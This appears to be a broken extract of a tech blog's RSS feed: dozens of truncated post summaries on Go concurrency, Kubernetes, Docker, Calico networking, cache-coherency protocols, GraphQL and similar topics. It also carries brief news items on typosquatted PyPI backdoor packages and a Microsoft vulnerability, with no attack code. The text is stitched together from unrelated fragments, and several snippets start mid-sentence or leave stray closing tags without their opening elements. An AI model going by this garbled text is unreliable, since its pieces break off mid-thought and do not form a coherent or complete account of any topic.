Bus What is a bus? The bus is usually used to connect CPU and peripherals. For better compatibility and reusability, it is thought that a unified protocol can be designed, where the CPU implementation is the party that initiates the request (also known as master) and the peripheral implementation is the party that receives the request (also known as slave), so that if you want to add peripherals or replace the CPU implementation, it becomes simpler and reduces a lot of adaptation workload.</description>

      <description>For unstructured data storage systems, LIST operations are usually very heavyweight, not only consuming a lot of disk IO, network bandwidth and CPU, but also affecting other requests in the same time period (especially the response latency demanding master selection requests), which is a major cluster stability killer. For example, for Ceph object storage, each LIST bucket request needs to go to multiple disks to retrieve all the data of</description>

      <description>If you are concerned about distributed databases, I believe you have more or less heard of Google&amp;rsquo;s distributed database Spanner, and how Spanner uses atomic clocks to make a set of TrueTime to achieve distributed transactions across data centers.
Many people have the impression that Google is so rich that it can afford to use atomic clocks as a sophisticated high-end device. This statement cannot be said to be entirely wrong, but at least it is not completely accurate.</description>

      <description>Overview When all hosts in a cluster are on the same Layer 2, calico cni can make all Pod networks interoperate by just routing. However, a pure Layer 2 environment is not always possible in many scenarios, so when hosts interoperate with each other at only Layer 3, the calico IPIP (full name IP in IP) mode can be used. IP in IP is an IP tunneling protocol whose core</description>

      <description>Overview proxy_arp is a configuration of the NIC that, when enabled, will use its own MAC address to respond to ARP requests from non-self IPs.
A common use is when two hosts&amp;rsquo; IPs are in the same network segment, but the Layer 2 is not working, you can use an additional host as a proxy, and turn on proxy_arp on this host&amp;rsquo;s NIC to act as an intermediate proxy to open the network.</description>

      <description>1. Matching application architecture with business development and operation and maintenance capabilities In industry conferences and documentation blogs, we often see various excellent solutions, but if we directly copy them to our own business, we often hit a wall. Because these technical solutions are incubated in specific business scenarios, different business forms, different business scales, and different business development stages will affect the implementation of the technology.
On the other hand, applications need to be maintained by people, and a suitable platform needs to be built to assist in the management of the application life cycle, which requires matching operation and maintenance capabilities.</description>

      <description>When it comes to Docker containers, according to the usual thinking, that is Linux containers (LXC), not much to do with Windows, at best, is to run Docker containers in the Windows Linux virtual machine.
However, since Windows Server 2016, there are Windows-native Docker containers, which are no longer just for Linux, and Docker containers can now run Windows systems, with each Windows container sharing the host Windows kernel (&amp;ndash;isolation= process,) or use a Windows kernel in a highly optimized virtual machine (&amp;ndash;isolation=hyperv).</description>

      <description>1. Overview It is often necessary to use bash to batch process file formats, and it is troublesome to query some basic syntax every time.
So this article summarizes some common syntax when using Bash to traverse a folder directory to process images as an example.
2. Iteration Bash traversal is relatively simple and not significantly different from the for loops of most programming languages.

      <description>eventfd definition The eventfd() function creates an &amp;ldquo;eventfd object&amp;rdquo; that can be used by the user-state program as an event waiting/notification mechanism and the kernel can notify the user-state program of the event.
1 2  #include &amp;lt;sys/eventfd.h&amp;gt;int eventfd(unsigned int initval, int flags);   Initialization parameters initval The eventfd object contains a uint64_t counter, which is saved by the kernel. The value of this counter can be initialized by the initval parameter when initializing eventfd.</description>

      <description>According to a recent report by BleepingComputer, several PyPI packages have been found to contain backdoors due to malicious request dependencies in some versions of these packages, including pyanxdns, api-res-py, and keep.
Keep, for example, uses the legitimate Python module requests for HTTP requests, but keep v.1.2 includes a module named request (note: the latter is missing the letter s at the end), and request without the letter s is considered a malicious dependency, although there is only a one-letter difference.</description>

      <description>First, concurrency safety Golang actually provides a shared memory-based approach in addition to the CSP programming model. For example, there are. sync.Mutex: Mutual exclusion lock sync.WaitGroup: Wait group, wait for all the Goroutines in the group to finish before exiting Atomic operations. For example atomic.AddUint64 (sync/atomic package), thread-safe, no locking required Single instance objects (sync.Once package), which are only initialized once when accessed concurrently by multiple Goroutines The following example</description>

      <description>Container GC Exiting containers continue to use system resources, such as storing a lot of data on the filesystem and the CPU and memory that Docker applications use to maintain these containers. Docker itself does not automatically delete exiting containers, so kubelet takes over this responsibility. kubelet container recycling is used to delete exiting containers to save space on nodes and improve performance. While container GC is good for space</description>

      <title>memory ballast and gc tuner are history</title>
      <link>https://www.sobyte.net/post/2022-06/memory-ballast-gc-tuner/</link>
      <pubDate>Tue, 14 Jun 2022 12:12:30 +0800</pubDate>
      
      <guid>https://www.sobyte.net/post/2022-06/memory-ballast-gc-tuner/</guid>
      <description>memory ballast and auto gc tuner are optimizations to solve the problem of Go triggering frequent GCs when memory is not fully utilized, resulting in high CPU usage of GCs.
memory ballast tricks GOGC by allocating a huge object (typically several GB) on the heap, allowing Go to use as much heap space as possible to reduce the frequency of GC triggers.
The auto gc tuner shared by uber later is a bit smarter, setting the program&amp;rsquo;s memory usage threshold and dynamically setting the GOGC every time a GC is triggered by a callback to the user&amp;rsquo;s finalizer function during a GC, so that the memory used by the application gradually converges to the target.</description>

Overloading templates Not all types use the same algorithm, and it is possible to overload template function definitions just like regular functions.

      <description>On May 7, 2022, the Go 1.19 development branch entered the new feature freeze phase, which means that only bugs can be fixed and no new features can be added to Go 1.19. As the previous version of Go 1.18 was delayed by one month due to the introduction of generic changes, this directly led to a shortened development cycle for Go 1.19.
Although the development cycle is nearly a month shorter, Go 1.</description>

      <description>Kubernetes provides a Pod graceful exit mechanism that allows Pods to complete some cleanup before exiting. But if something goes wrong while performing cleanup, will the Pod exit properly? How long does it take to exit? Can the exit time be specified? Does the system have default parameters? There are several details that we should pay attention to, and this article will start from these details to sort out the behavior of Kubernetes components and their parameters in each case.</description>

      <description>Earlier I have built a local k3s cluster of two machines and deployed Crawlab (a distributed crawler management platform developed using Golang) to achieve a local distributed cluster service environment. After the service is up, we need Kubernetes to control the container nodes dynamically, monitor the container running status, and achieve even the expansion. Fortunately, Kubernetes directly provides python and golang clients, which can easily implement Kubernetes API operations. So</description>

      <description>1 Preface  In a nutshell: save and reuse temporary objects, reduce memory allocation, and reduce GC pressure.
 sync.Pool works roughly as follows.
 A local object pool poolLocal is created for each P to minimize concurrency conflicts, taking advantage of GMP features. Each poolLocal has a private object, and access to private objects is given priority to avoid complex logic. Use pin to lock the current P during Get and Put to prevent the goroutine from being preempted and causing program chaos.</description>

      <description>1. Why do you need secondary scheduling The role of the Kubernetes scheduler is to bind Pods to a particular best-of-breed node. In order to do this, the scheduler needs to perform a series of filters and scoring.
Kubernetes scheduling is based on Request, but the actual usage values of each Pod are dynamically changing. After a period of time, the load on the nodes is uneven. Some nodes are overloaded, while others are underused.</description>

      <description>Cross-origin resource sharing (CORS) is a mechanism for making restricted resources of a web page accessible to pages from other domains based on HTTP headers. Through this mechanism, pages can freely use images, styles, scripts, iframes, and videos from different sources (cross-origin).
In general, some cross-origin requests (especially ajax) are prohibited by the same-origin policy. CORS defines a way to allow web application servers to perform cross-origin access control, thus enabling secure cross-origin data transfer.</description>

      <description>In k8s administration, resources like secrets are not well maintained. kubeseal provides a relatively simple way to encrypt the original secret resource and decrypt it through the controller as a way to circumvent the risk of secret leakage.
install kubeseal 1 2 3 4  $ wget https://github.com/bitnami-labs/sealed-secrets/releases/download/v0.18.0/kubeseal-0.18.0-linux-amd64.tar.gz $ tar -xvf kubeseal-0.18.0-linux-amd64.tar.gz $ cp kubeseal /usr/local/bin/ $ kubeseal --version   Install controller.
1  $ kubectl apply -f https://github.com/bitnami-labs/sealed-secrets/releases/download/v0.18.0/controller.yaml   After executing the above command, a controller Pod will be started under the kube-system namespace.</description>

      <description>RPC Here is the explanation of RPC from Wikipedia, which can be compared with HTTP protocol, RPC is more suitable for distributed call scenarios in large and medium-sized projects in companies.
 In distributed computing, Remote Procedure Call (RPC for short) is a computer communication protocol. The protocol allows a program running on one computer to call a subroutine in another address space (usually a computer on an open network) without the programmer having to additionally program this interaction (without attention to detail), just as if it were a local program.</description>

      <description>Brew is a package management tool on Mac, just like apt, yum, rpm on Linux, which can provide non-graphical software installation. Yesterday, while building the most powerful IDE in the universe, I used the brew tool to update the packages. Upgraded my Go version to the latest version, and wiped out the previously configured multiple versions of Go.
Option 1 brew switch 1. brew install 1  brew install go   By default you can install the latest version of go, and then install the specified version, using the brew switch command to switch between them.</description>

      <guid>https://www.sobyte.net/post/2022-06/go-rwmutex/</guid>
      <description>Mutex is used to ensure that only one goroutine accesses a shared resource. In a large number of concurrent scenarios, especially read scenarios, a shared resource block can only be accessed serially by a goroutine, which leads to performance impact, and the solution is to distinguish between read and write operations.
This turns a serial read into a parallel read, which is used to improve the performance of read operations.</description>

heap Taking minheap minimal binomial heap as an example, the heap has the following properties.
 Any node is smaller than all its children, and the smallest node is at the root of the heap (heap orderliness) The heap is a complete tree: i.e., all nodes in all layers except the bottom layer are filled with elements, and the bottom layer is filled from left to right as much as possible.</description>

      <description>In Go language, how to handle string summing efficiently? Since strings are immutable, stitching many strings together is like declaring a new variable to store. Here we can use strings.Builder or bytes.Buffer to solve the string summing performance problem. In addition to performance issues, it is important to note that bytes.Buffer handles the conversion between []byte and string. Here are some of the errors written in the actual project for your reference.</description>

Concepts Speaking of coroutine is generally associated with processes and threads, usually please compare the three as follows.
 Process: an instance of program execution, a process contains at least one thread, and switching between different processes is costly. Thread: the basic unit of CPU scheduling, an entity of a process, the context switching cost of threads is smaller than that of processes.</description>

      <guid>https://www.sobyte.net/post/2022-06/iptables-and-firewalld/</guid>
      <description>firewalld in CentOS is built on iptables and some other programs. firewalld uses some more friendly configuration methods to implement iptables operations. It also extends some features that are not supported by iptables itself, such as timed firewall rules. The full program and library dependencies are available on the firewalld website at https://firewalld.org/.
iptables processes network packets by manipulating the Linux kernel netfilter module.
Please temporarily disable the firewalld firewall on your machine before operating the command, and make sure you have access to the physical machine (or a physical terminal in a virtual machine), as some rules will block access to SSH port 22 and prevent subsequent operations.</description>

      <description>RxJava uses a chain call design similar to the Stream API , providing filter, map, observeOn and other common operators . Unlike the Builder pattern, which does not require any order of method calls, RxJava&amp;rsquo;s operator calls need to maintain sequential relationships. A typical chain call scenario is as follows.
1 2 3 4 5 6  Observable .create(...) .filter(...) .map(...) .observeOn(...) .subscribe(...)   The chain call is triggered from subscribe() and we look at the corresponding source code.</description>

A Worktree is multiple workspaces linked to a unified repository. A git repository can support multiple worktrees, corresponding to different branches.
I saw a tweet from Guido van Rossum on Twitter about why he didn&amp;rsquo;t know about the git worktree usage before. This piqued my curiosity, as I don&amp;rsquo;t usually encounter scenarios where I need to use this command in my work.</description>

The Go language natively provides the tool pprof, which is explained by Google as a tool for visualizing and analyzing data.
By using Go pprof, you can profile the CPU performance, memory usage, Goroutine wait share resource, and mutex lock of your program.</description>

      <description>Recently, the project needs to implement version control of single data, so there is a table (foo) dedicated to storing key data and another table (bar) dedicated to storing Data data, how to get the latest version of all the key data in the bar table? Let&amp;rsquo;s take a look at the schema example.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  -- foo table DROPTABLEIFEXISTS&amp;#34;foo&amp;#34;;CREATETABLE`foo`(`id`INTEGERPRIMARYKEYAUTOINCREMENTNOTNULL,`name`TEXTNULL,`key`TEXTNULL,`created_at`DATETIMENULL,`updated_at`DATETIMENULL);-- bar table CREATETABLE`bar`(`id`INTEGERPRIMARYKEYAUTOINCREMENTNOTNULL,`foo_id`INTEGERNULL,`is_deleted`INTEGERNULL,`timestamp`INTEGERNULL,`created_at`DATETIMENULL,`data`TEXTNULL,`memo`TEXTNULL)  The name + key in the foo table is a unique value, so it will be a one-to-many state, and a key will correspond to multiple sets of data in the bar.</description>

      <description>Channel Basics Channels are divided into read and write. If you use a lot of channels in the real world, please note that reading and writing channels anywhere in the code may cause different situations. Therefore, to avoid abusing channels in the team, I usually limit the situations in which I can only write and in which I can only read. If you mix them up, it will be very difficult to debug them, and also very difficult for the reviewer to read and understand.</description>

      <description>Suppose you have a private Git Repository in your project, how do you solve it? Right now go mod defaults to proxy.golang.org to grab the latest data, but if you want to grab the private one, you need to do it some other way:
1  go env -w GOPRIVATE=github.com/appleboy   The above represents the go command that tells you to read github.com/appleboy as soon as you encounter it, no need to go through the Proxy process.</description>

      <description>Context was officially included in the official standard library in Go language version 1.7. Why do we introduce the use of context today? The reason is simple. When learning Go for the first time and writing APIs, you will often see that the first parameter in the http handler is ctx context.Context, and what exactly is the purpose and meaning of this context used here? This article is to bring you to understand what context is and how it is used.</description>

      <guid>https://www.sobyte.net/post/2022-06/go-modcache/</guid>
      <description>I believe that all developers writing Go language projects must be using Go module now, and Go module files are written in /go/pkg/mod directory by default, so when you want to string CI/CD process, because it is not under the project path, each container cannot share the /go/pkg/mod path, resulting in repeated downloads of third-party packages. In fact, the cross-container solution can be solved by Drone&amp;rsquo;s Temporary Volumes, but eventually, when you want to finish the compilation process, you can pack the final mod directory and save it for the next CI/CD deployment process, and if you can change the /go/pkg/mod path, you can dynamically adjust the directory structure.</description>

      <description>Today we talk about an important computer concept that you may have heard of, but rarely delve into, and that is byte order (Endianness).
1. Concepts Byte order refers to the order in which multiple bytes of data are arranged in memory . This is rather abstract, but it is well understood using a graphical explanation.
Memory is like a row of rooms, and each byte is a room. Each room has a door number (memory address), starting from 0, then 1, 2 &amp;hellip;&amp;hellip;</description>

      <description>As a web engineer, you can&amp;rsquo;t afford not to know what GraphQL is. It is an API Query syntax for front-end and back-end communication, which significantly improves the cooperation model between front-end and back-end, and this article will introduce to you why you should learn GraphQL, and organize the three major advantages of GraphQL, so that you can understand what is different from traditional RESTful API. Of course, we are not telling developers to abandon RESTful APIs, but to decide on different technology stacks depending on the project, for example, service to service calls are not suitable to use GraphQL, but to use the lighter RESTful API or gRPC.</description>

      <description>When you enter the world of Go Language, you must be attracted by the powerful Concurrency, which can be used to drop tasks into the background with the simplest keyword go, but how to control Concurrency efficiently is a must-learning for Go language. This article introduces three ways to get acquainted with Concurrency, which correspond to three different terms: WaitGroup, Channel, and Context.
WaitGroup Suppose you have two machines that need to upload the latest code at the same time, and the last restart step can be executed only after the two machines have finished uploading separately.</description>

If you are interested, you can take a look at it, and this article will use a real-life example to introduce why the author says that writing Concurrency is not so easy. As you know, in Go Language, you can write Concurrency easily by using the keyword go, but multiple Goroutines need to communicate by channel.</description>

The vulnerability was first discovered and reported to Microsoft by a Shadow Chaser Group researcher in April, and proved to have been exploited by hackers in an attack. The researcher said Microsoft initially marked the vulnerability as not a &amp;ldquo;security-related issue&amp;rdquo;, but later closed the vulnerability submission report citing the existence of a remote code execution vulnerability.</description>

      <description>In this article, we will introduce to you why signal.Notify should use buffered channel. When we want to do graceful shutdown, we will use this function to shut down the service or connection normally. Through signal, we can detect the source of the signal and do the follow-up work (shut down DB connection, check if the job is finished &amp;hellip; etc.).

When the service receives a shutdown notification signal, it should stop accepting jobs first, and then wait for the worker to finish processing the jobs before stopping the service, and then go online again. How to stop the service by docker-compose is the focus of this article.</description>

      <description>Go has released version 1.18 not long ago. One of the most important features of 1.18 is generics. Before this release, the most criticized thing was that Go could not support multiple types as parameters, which caused a lot of repetitive code when writing packages. This article will teach you the basics of what generics are and how to use them.

      <description>Recently, I received a business requirement that I need a batch export image function. It was suggested that the download task should be submitted to the server side, which would complete the packaging and then give the download link. I personally feel that this function can be implemented directly in the browser. So I did some research and found a feasible solution. Today, I will share it with you.
The solution presented in this article uses Chrome&amp;rsquo;s proprietary API, so it will not work properly with Firefox 😂.</description>

      <description>gomacro is a near-complete Go interpreter, implemented in pure Go, that provides both interactive REPL and scripting modes and does not require the Go toolchain at runtime (except for some very specific scenarios: importing third-party packages at runtime). It has two dependencies outside the Go standard library: github.com/peterh/liner and golang.org/x/tools/go/packages.
REPL is an acronym for Read-Eval-Print Loop, a simple, interactive programming environment where REPL means, respectively.
 Read: gets user input Eval: Evaluate the input Print: prints and outputs the result of the evaluation Loop: loop that repeats Read-Eval-Print over and over again  REPL is very useful for learning a new programming language, and you can quickly verify your understanding through the output in this interactive environment.</description>

      <description>After deploying a service, it&amp;rsquo;s important to make it clear to the team that the service is running. For example, GitHub provides a overall running page that monitors the status of common operations such as Git Operations, Webhooks, or GitHub Actions and other services. This allows developers to check the status of their services in real time when they encounter problems and take appropriate action. There are many online services like this, such as Atlassian&amp;rsquo;s Statuspage or PingPong, and more free services can be found directly at See awesome-status-pages for more free services.</description>

      <description>In Go, it is easy to write Benchmark functions to test the performance of a function point. For important functions, we can add the corresponding test process in CI/CD to be aware of the function performance changes when they occur. So the question is, how do you detect performance changes in a function?
To put it another way, you write a function and find that it is slow and you need to optimize it, and when you Google it and find a better implementation, you find that it is indeed faster through the Benchmark function.</description>

Use node_exporter as a source for production-like metrics. use nginx as a caching proxy in front of node_exporter to reduce the load on node_exporter when it crawls too many metrics. Use vmagent to grab node_exporter</description>

If the property is a basic type, the copy is the value of the basic type, and if the property is a reference type, the copy is the memory address . Without a deep copy, one of the objects changes the value of the object and affects</description>

      <description>ECMAScript (aka ES2015 or ES) modules are a way to organize cohesive blocks of code in JavaScript.
The ES module system has 2 parts.
 import module - use import { func } from &#39;. /myModule&#39; export module - uses export const func = () =&amp;gt; {}  An import module is a module that imports dependencies using the import syntax.

      <description>OpenAPI (formerly known as Swagger) is the more popular protocol for defining HTTP APIs. However, the OpenAPI definition file is in a machine-friendly format that is not easy to write and read. Here is a method to generate OpenAPI definition files based on Go code using go-swagger. This method uses only Go code to define the API, and does not force the Server or Client to use Go as well.</description>

The following mainly refers to the IHI0022E version, which is the ACE version corresponding to AXI4.
Review Let&amp;rsquo;s start by reviewing what operations a cache coherency protocol needs to support. For a higher-level Cache, it needs a few things:
 when reading or writing a miss, it needs to request data from this cache line and update its status, such as read to Shared, write to Modified, etc.</description>

      <description>As we all know, javascript has been a single-threaded, non-blocking scripting language since its inception. This was dictated by its original purpose: to interact with browsers.
Single-threaded means that javascript code has only one main thread to handle all tasks at any given time of execution.
Non-blocking means that when the code needs to perform an asynchronous task (a task that does not return a result immediately and takes some time to return, such as an I/O event), the main thread suspends (pends) the task and then executes the corresponding callback when the asynchronous task returns a result, according to certain rules.</description>

If a small component is not available, the system should be able to detect it, bypass it and fix it, and this should be done automatically. A health check is a simple way for the system to know if an instance of an application (service) is working properly.</description>

It is well known that NVIDIA has been very resistant to embracing open source, unlike its old rival AMD, which is very enthusiastic about open source. Although they provide excellent Linux driver support, their private, closed-source drivers have been criticized by the Linux community. For example, the famous Linus + middle finger + &amp;ldquo;So, fxxk you NVIDIA&amp;rdquo;, and the Fedora project lead has posted bashing NVIDIA for its proprietary driver software stack.</description>

      <description>Yesterday there was a problem with the network environment, the local virtual machine built Kubernetes environment does not have a fixed IP, the result of the node IP changed, of course the easiest way is to re-fix the node back to the previous IP address, but I stubbornly want to modify the IP address of the cluster, the results encountered a lot of problems, and not as simple as I</description>

      <description>To talk about network protocols, we can&amp;rsquo;t leave the seven-layer model of OSI (Open System Interconnection). We generally focus on the layers above the network layer, such as IPV4 IPV6 in the network layer, TCP UDP in the transport layer, HTTP FTP in the application layer, etc.
Today&amp;rsquo;s sctp protocol, known as Stream Control Transmission Protocol, is proposed by the IETF in RFC 4960.
The transport layer has been widely used TCP and UDP protocols, so why do we have to invent a SCTP protocol?</description>

      <description>We all know that Docker is a C/S model architecture, where containers are created and managed by accessing the Docker Daemon through a client (CLI). By default, when the daemon terminates, it stops all running containers.
So when we need to upgrade the Docker Daemon or perform some maintenance operations that require restarting, we need to cause the running containers to restart along with it.
Live Restore In fact, Docker provides a feature that keeps containers running when Daemon is unavailable, thus reducing container downtime when Daemon is upgraded or has problems.</description>

      <description>1. Description Recursion is a method of solving a problem by repeatedly decomposing it into identical subproblems.
Scenarios that require recursion usually have the following characteristics.
 the original problem can be decomposed into subproblems and the subproblems are the same as the original problem there is a clear termination condition  Common applications of recursion are as follows.
 recursive data solving (Fibonacci function) data structure forms with obvious recursive properties such as binary trees, generalized tables, etc.</description>

      <guid>https://www.sobyte.net/post/2022-05/fluid/</guid>
      <description>Fluid is a cloud-native distributed data set orchestration and acceleration engine, mainly serving data-intensive applications in cloud-native scenarios, such as big data applications, AI applications, and so on. In this paper, we will introduce the main working principle of Fluid from two aspects: data orchestration and data acceleration.
Architecture The whole architecture of Fluid is divided into two main parts.
One is the Controller, including RuntimeController and DatasetController, which manage the lifecycle of Runtime and Dataset respectively, and both of them work together to build a complete distributed caching system based on helm chart, usually in the form of master + worker + fuse to provide services upwards.</description>

      <description>Today we share Apache EventMesh event-driven distributed application runtime, which is a relatively new concept, and we hope we can bring some inspiration to you through this sharing.
We all understand two concepts - message and event. Message refers to the update of a specific event, and this update is sent from one point to another after the message is deleted, and the message is a temporary state of existence; while event refers to what happens at a specific time, it is not bound to a specific recipient or client, and it is often can be replayed, backtracked and reworked.</description>

      <description>Python has become incredibly popular in recent years. The Python language is cheap to learn, writes like pseudo-code (even like English), is highly readable, and has many other obvious benefits. It is favored by DevOps, Data Science, and Web Development scenarios. But these reputations never include Python&amp;rsquo;s speed. Compared to other languages, whether JIT or AOT, Python is almost always the slowest. There are many aspects that contribute to Python&amp;rsquo;s performance problems, and this article tries to talk about them.</description>

The scp command is based on the ssh protocol, so why bother with scp when you can use ssh?</description>

      <description>Normally when we use a computer, our intuition is that the computer is divided into two kinds of things: folders and files. But in fact, in the operating system&amp;rsquo;s file system, folders can also be thought of as files that store special content; &amp;ldquo;everything is a file&amp;rdquo;. And the file system doesn&amp;rsquo;t use file names to distinguish files, but rather a string of non-repeating numbers. In this article, we will introduce some concepts and principles of the file system.</description>

      <description>Background Recently, I have been working on some cache implementations that support cache coherency, such as the rocket-chip implementation and the sifive implementation, so I need to study some TileLink protocols. This article assumes that the reader has some knowledge of AXI, so much of the content will refer directly to AXI.
Signals According to TileLink Spec 1.8.0, TileLink is divided into the following Three types.
 TL-UL: Read/write only, no burst support, analogous to AXI-Lite TL-UH: read/write support, atomic instruction, prefetch, burst support, analogous to AXI+ATOP (atomic operation introduced by AXI5) TL-C: support cache coherency protocol based on TL-UH, analogous to AXI+ACE/CHI  TileLink Uncached TileLink Uncached (TL-UL and TL-UH) consists of two channels.</description>

      <guid>https://www.sobyte.net/post/2022-05/git-lfs/</guid>
      <description>Git LFS (Git Large File Storage) is used to solve the problem of storing large binary files that are committed to a git repository.
Based on git&amp;rsquo;s versioning mechanism, when frequent changes are made and large binary files are committed to the repository, the size of the repository expands rapidly, causing problems such as slow repository pulls and commits.
Git LFS puts the specified type of file versioning on the LFS large file server according to a set of rules, and the git repository only uses the index index to point to the corresponding file on the LFS large file server.</description>

      <description>Split lock is a memory bus lock supported by the CPU to support atomic memory accesses across a cache line. Some processors like ARM and RISC-V do not allow unaligned memory accesses and do not generate atomic accesses across cache lines, so split lock is not generated, while X86 supports it. Split lock is convenient for developers because there is no need to consider unaligned memory access, but it also</description>

      <description>When I looked at the compiler support for cppreference recently, I found that libstdc++ already implements &amp;lt;expected&amp;gt;, but unfortunately I didn&amp;rsquo;t find much information about it on the web. What is std::expected? It is similar to std::optional, but std::optional can only indicate a normal value or std::nullopt, i.e. a null value. In contrast, std::expected can indicate an expected value and an error value, which is equivalent to the two-member std::variant,</description>

      <description>Anaconda developers recently released PyScript, a framework that allows developers to mix Python code into HTML, which some have called &amp;ldquo;JSP for Python&amp;rdquo;. In fact, PyScript uses WebAssembly for its underlying layer, as it is built on Pyodide, which consists of a CPython 3.8 interpreter compiled into WebAssembly that allows Python to be run in a web browser.
It&amp;rsquo;s no coincidence that the developers have adopted the same idea to make Go run smoothly on the browser as well.</description>

      <description>Prior to Docker v19.03, we could use the DOCKER_HOST environment variable to configure and connect to remote Docker hosts. Since Docker v19.03, Docker&amp;rsquo;s command line interface (CLI) has added a subcommand: context, which is used to manage docker clients connecting to multiple contexts.
The context command allows you to connect and manage multiple Docker hosts remotely by configuring contexts for the SSH protocol, as well as exporting a context environment from a machine with the Docker CLI installed and importing it on another machine with the Docker CLI installed.</description>

For this purpose, vmstorage provides two parameters: maxHourlySeries and maxDailySeries, which are used to limit the unique series added to the cache per hour/day. uniqueSeries means a unique time series, such as metrics{label1=&amp;quot;value1&amp;quot;,label2=&amp;quot;value2&amp;quot;} belonging to a time series.</description>

      <description>This article introduces the knowledge and concepts related to hard drive partitioning. I think the content related to this is difficult to understand because part of it is a hardware concept and part of it is software (file system), and a lot of information is introduced without putting it together for comparison, so the reader will be very vague about some concepts when he sees it. For example, hard disk</description>

      <guid>https://www.sobyte.net/post/2022-05/docker-image-tips/</guid>
      <description>In my previous blog on how Docker (containers) works, I described how Docker image works. In simple terms, it uses Linux&amp;rsquo;s overlayfs, overlay file system, to merge two file systems together, with the lower file system being read-only and the upper file system being writable. If you read, you find the upper layer and read the upper layer, otherwise you find the lower layer and read it to you. Then if you write, you write to the upper layer.</description>

      <description>When it comes to Emacs, every programmer should have more or less heard of its name, after all, Emacs has a long history of nearly forty years. However, the high threshold for Emacs &amp;ldquo;entry&amp;rdquo; has led many beginners to abandon it before they can appreciate its essence. Before I became &amp;ldquo;proficient&amp;rdquo; in Emacs, I was also abused by it, so after using Emacs for four years, I think I can</description>

      <description>In this post we explore the key techniques in thread pooling by implementing it step by step.
Preliminary discussion Why do I need thread pools? Using threads in C++ has been easy since C++11. At the most basic level, a thread can be managed with std::thread. For asynchronous execution of tasks, it is also convenient to use std::async and std::future. With all this infrastructure in place, why do we need a thread pool?</description>

      <description>Birth of WebSocket In 2005, with the birth and application of AJAX technology, it became possible to request data from a web page to a server and render the page dynamically. HTTP is a one-way transmission protocol that can only be sent by the client, and it is really difficult to obtain continuous real-time information. People started this fancy exploration of real-time access to information technology.
Relying on the HTTP protocol, the more widespread way is polling.</description>

      <description>Earlier we described the use of the single-node version of VictoriaMetrics. For ingestion rates below one million data points per second, it is recommended that the single-node version be used instead of the clustered version. The single-node version scales with the number of CPU cores, RAM, and available storage space. The single-node version is easier to configure and operate than the clustered version, so think twice before using the clustered</description>

      <description>Distributed Systems and Consistency Distributed systems have a very important problem to solve. When one machine has a problem, we want the whole cluster to still be able to run normally to meet the requirement of high availability. Because the data of the system is constantly changing, it is important to ensure that the data of the cluster is synchronized, or else there will be data mix-ups or loss. This is the consistency problem.</description>

      <description>Node.js and Deno founder Ryan Dahl&amp;rsquo;s &amp;ldquo;JavaScript Containers&amp;rdquo; article published yesterday presents a vision of a future in which new container-like abstractions will emerge to simplify servers. Most Web services can be simplified by JavaScript containers rather than Linux containers. In this emerging server abstraction layer, JavaScript replaces the Shell.
He proposed a vision to make JavaScript the standard language for containers. This way, containers could be standardized, and developers would not have to build their own container image files, but just throw JS scripts into the standardized containers.</description>

At the time, officials teased that it would limit the number of times users could copy and paste code from websites, and that developers would need to buy a special keyboard if they wanted to use it indefinitely.
Once announced, the keyboard attracted the attention of many developers, who asked Stack Overflow to mass produce it.</description>

      <description>rollup.js is a JavaScript packaging tool. This article describes its basic usage.
1. Introduction The purpose of the packager tool is to combine multiple JavaScript scripts into a single script for the browser.
Browsers need script packaging for three main reasons.
 Early browsers did not support modules, and large web projects could only be merged into a single script before execution. The module mechanism of Node.js is not compatible with browsers and must be handled for compatibility by packaging tools.</description>

At first glance, it seems to be a very simple command with few scenarios, but it is just another version of ls. But because of the unix philosophy of everything is a file, basically all objects on a *nix system can be considered as objects, and with the various arguments provided by this command, it is actually very powerful and can easily get a lot of very useful information, some of which would be very troublesome with other tools.</description>

 When an object is created and properties are added to that object, each property has a default property descriptor associated with it. A property descriptor is a javascript object that contains some information about the corresponding property, such as value.
Object.getOwnPropertyDescriptor To get the property descriptor of a property, you can use the static method Object.</description>

      <description>Reading and Writing Files Let&amp;rsquo;s start by talking about reading and writing files, and what&amp;rsquo;s going on behind the scenes when we try to write a string of characters to a file, like the following lines of Python code.
1 2 3  f = open(&amp;#34;file.txt&amp;#34;, &amp;#34;w&amp;#34;) f.write(&amp;#34;hello world&amp;#34;) f.close()   With the strace command, it is easy to see which system calls are used behind this line of command.</description>

      <description>Even if we count from K&amp;amp;R C in 1978, C will be 44 years old in 2022. I don&amp;rsquo;t know what C looks like in the reader&amp;rsquo;s mind, but I have the impression that C has poor expressiveness, only two high-level data structures, arrays and pointers, a small standard library and many historical problems, and no package management mechanism. The most fatal thing is that memory needs to be managed</description>

      <description>RisingWave is a recent open source Rust written cloud native streaming database product. Today a brief description of the state management mechanism in RisingWave based on the following diagram.
Hummock Overview In RisingWave&amp;rsquo;s architecture, the storage of all internal state and materialized views is based on a set of stores called Hummock, which is not a storage system but a storage library. Hummock is not a storage system, but a storage library, and Hummock currently supports S3 protocol-compliant storage services as its backend.</description>

      <description>This article documents my experience in building Docker images for multi-system architectures, as well as some of my personal understandings.
Pre-requisite knowledge CPU architectures The mainstream CPU architectures are of two types: x86 and ARM, but they are not always named as such during development. For example, amd64 and x86_64 refer to the 64-bit architecture of x86, while arm64v8, aarch64, and arm64 refer to the 64-bit architecture of ARM.
In the docker hub, the supported architectures are listed for all major images, and you can filter the images by Architectures.</description>

      <description>As with every major GCC release, GCC 12.1, which will be released this week, brings many new features, improvements, and bug fixes. In a recent blog post, Red Hat&amp;rsquo;s Marek Polacek outlines some of the C++ language improvements that have been made in this major GNU Compiler Collection update.
Polacek notes that a total of several C++23 proposals are implemented in GCC 12. The default dialect in GCC 12 is -std=gnu++17; to enable C++23 features, you need to use the -std=c++23 or -std=gnu++23 command-line option, the latter of which allows GNU extensions.</description>

      <description>Libvirt is a set of open source software tools developed by Redhat. The goal is to provide a common and stable software library to manage virtual machines on a node efficiently and securely, and to support remote operations. Libvirt shields different virtualization implementations and provides a unified management interface. Users only care about the high-level functions, and the implementation details of VMM should be transparent to end users. libvirt then</description>

      <description>Overview Since gRPC&amp;rsquo;s asynchronous call code is rather convoluted, this article is mainly used to document gRPC&amp;rsquo;s asynchronous calls. Note that gRPC uses the CompletionQueue binding for RPC calls in order to implement asynchronous calls, which can feel strange when writing the actual code. The response, because it is asynchronous, calls CompletionQueue::Next to wait for the packet return operation. Leave an impression here first, it will be clearer when talking</description>

      <description>Why VLANs are needed What is VLAN A LAN can be a network of a few home computers or a corporate network of hundreds of computers, and a VLAN (Virtual LAN) refers specifically to a network that is segmented using routers - that is, a broadcast domain.
